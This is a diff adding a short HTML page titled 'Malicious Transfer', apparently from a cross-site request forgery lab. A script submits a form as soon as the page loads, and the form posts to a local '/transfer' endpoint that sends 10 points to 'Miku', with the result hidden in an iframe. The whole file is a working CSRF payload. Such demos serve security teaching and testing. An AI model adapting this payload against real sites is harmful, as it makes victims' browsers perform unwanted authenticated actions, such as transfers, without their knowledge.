@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	<title>Malicious Transfer</title>
+  </head>
+  <body>
+
+    <iframe name="innerFrame"></iframe>
+
+    <form action="http://localhost:8080/transfer" method="POST" target="innerFrame">
+      <input name="to" value="Miku">
+      <input name="pointsToTransfer" value="10">
+    </form>
+
+    <script>
+      document.querySelector("form").submit();
+    </script>
+
+  </body>
+</html>
